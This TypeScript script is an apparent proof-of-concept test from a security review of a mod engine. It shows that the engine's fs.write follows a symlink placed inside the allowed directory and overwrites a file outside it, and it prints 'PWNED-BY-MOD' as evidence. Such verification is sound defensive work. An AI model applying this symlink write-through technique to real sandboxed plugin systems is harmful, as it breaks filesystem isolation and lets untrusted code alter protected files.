/**
 * 抽验 tc-001：`ctx.fs.write()` 只对父目录做围栏检查，最终文件名是裸字符串拼接，
 * 故「父目录在围栏内 + 最终组件是已存在的文件符号链接」→ writeFile 跟随链接写穿围栏。
 * 同路径 read/list/exists 因对最终组件 realpath 而被正确拒绝。
 *
 * 直接调用真实 createModContext().fs，仅用模块自身导出的测试钩子
 * setModFsAuthOverrideForTesting 绕过 settings 读取。不 mock 被测对象。
 */
import { mkdirSync, writeFileSync, symlinkSync, rmSync, readFileSync } from 'node:fs'
import {
  createModContext,
  setModFsAuthOverrideForTesting,
} from '/Users/ethan/code/opencc/src/mods/engine.js'
import type { LoadedMod } from '/Users/ethan/code/opencc/src/mods/registry.js'

const ROOT = '/tmp/bughunt-workbuddy/fstest'
const INSIDE = `${ROOT}/inside`
const OUTSIDE = `${ROOT}/outside`

rmSync(ROOT, { recursive: true, force: true })
mkdirSync(INSIDE, { recursive: true })
mkdirSync(OUTSIDE, { recursive: true })
const secret = `${OUTSIDE}/secret.txt`
writeFileSync(secret, 'ORIGINAL-SECRET', 'utf8')
// 围栏内预置一个指向围栏外的文件符号链接
symlinkSync(secret, `${INSIDE}/link.txt`)

process.chdir(INSIDE)
setModFsAuthOverrideForTesting(() => true)

const mod: LoadedMod = {
  manifest: { name: 'wtest', entry: '(review)' },
  root: INSIDE,
  entryPath: '(review)',
  handlers: [],
  commands: [],
  tools: [],
}
const ctx = createModContext(mod)
const fs = ctx.fs!

console.log('fs API granted     :', fs !== undefined)
console.log('secret before      :', JSON.stringify(readFileSync(secret, 'utf8')))

// read 同路径应被拒绝
try {
  await fs.read(`${INSIDE}/link.txt`)
  console.log('fs.read(link)      : NOT BLOCKED')
} catch (e) {
  console.log('fs.read(link)      : blocked →', (e as Error).message.slice(0, 70))
}
console.log('fs.exists(link)    :', await fs.exists(`${INSIDE}/link.txt`))

// write 应当写穿
await fs.write(`${INSIDE}/link.txt`, 'PWNED-BY-MOD')
const after = readFileSync(secret, 'utf8')
console.log('secret after write :', JSON.stringify(after))
console.log(
  '  ⇒ 越权写穿围栏   :',
  after === 'PWNED-BY-MOD' ? 'YES（围栏外文件被改写）' : 'no',
)

rmSync(ROOT, { recursive: true, force: true })